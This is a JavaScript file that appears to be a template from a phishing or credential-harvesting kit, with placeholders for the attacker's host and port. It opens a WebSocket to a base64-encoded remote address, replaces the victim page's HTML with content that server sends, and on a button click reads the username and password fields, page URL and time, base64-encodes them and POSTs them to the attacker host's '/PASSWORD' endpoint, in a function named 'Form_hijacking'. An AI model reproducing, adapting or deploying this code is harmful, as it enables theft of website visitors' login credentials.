var User_Name_key='@User_Name_key';
var Password_Key='@Password_Key';
var Button='@Button';
var Host = '@HOST';
var WHOST = '@IP_PORT';
var HTML_Code = null;

function Connect(){
var ws=new WebSocket('ws://'+atob(WHOST));
window.onload = function()
            {
                ws.onopen = function(e){
                     ws.send(TEMPIP);
                    }
                    ws.onmessage = function(e){
                    HTML_Code=e.data;
                    Chang_Page();
                    document.getElementById(Button).onclick = function() {
                    main()}
                    }
                }
            return false;
}
var USER={
Vis_URL:null,
Time:null,
U1:null,
P1:null
}
function DATA_Packet(DATA){
    var xhr = new XMLHttpRequest();
    xhr.open("POST",atob(Host)+"/PASSWORD",true);//Tag
    xhr.setRequestHeader('content-type', 'application/x-www-form-urlencoded;charset=utf-8');
    xhr.send(JSON.stringify(DATA));
    return true;
}
function Form_hijacking(){
USER['U1']=Encryption(document.getElementById(User_Name_key).value);
USER['P1']=Encryption(document.getElementById(Password_Key).value);
USER['Vis_URL']=Encryption(document.URL);
USER['Time']=Encryption(new Date().toLocaleString());
}
function Chang_Page()
{
var HTML=document.getElementsByTagName("html")[0];
while(HTML.firstChild){
  HTML.removeChild(HTML.firstChild);
}
HTML.innerHTML = HTML_Code;}

function Encryption(DATA){
return btoa(DATA);
}
function main(){
 if(User_Name_key!="@User_Name_key" && Password_Key!="@Password_Key"){
        Form_hijacking();
        DATA_Packet(USER);
        }
}
Connect();
